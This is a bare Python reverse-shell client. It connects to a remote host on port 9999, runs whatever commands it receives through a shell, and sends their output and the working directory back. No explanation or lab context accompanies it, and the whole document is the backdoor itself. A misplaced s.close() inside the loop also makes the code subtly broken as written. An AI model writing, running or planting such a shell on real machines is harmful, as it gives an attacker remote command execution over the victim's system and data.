import socket
import os
import subprocess
s=socket.socket()
host=''
port=9999
s.connect((host,port))
while True:
    data=s.recv(1024)
    if data[:2].decode('utf-8')=='cd':
        os.chdir(data[3:].decode('utf-8'))
    elif len(data)>0:
        cmd=subprocess.Popen(
            data[:].decode('utf-8'),
            shell=True,
            stdout=subprocess.PIPE,
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE
            )
        output_byte=cmd.stderr.read()+cmd.stdout.read()
        output_str=str(output_byte,'utf-8')
        currentWD=os.getcwd()
        s.send(
            str.encode(output_str+currentWD)
        )
    s.close()
